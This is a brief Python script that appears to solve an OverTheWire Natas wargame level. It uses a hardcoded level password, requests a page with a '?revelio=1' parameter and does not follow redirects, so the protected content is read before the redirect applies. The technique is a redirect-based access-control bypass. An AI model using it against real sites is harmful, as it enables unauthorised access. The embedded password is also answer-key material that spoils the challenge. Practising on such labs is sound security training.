#!/usr/bin/env python

import requests
import re

username = 'natas22'
password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'

url = f'http://{username}.natas.labs.overthewire.org/?revelio=1'

session = requests.Session()
response = session.get(url, auth=(username, password), allow_redirects = False)
content = response.text
print(content)
print('='*80)

output = open('output.html', 'w')
output.write(content)

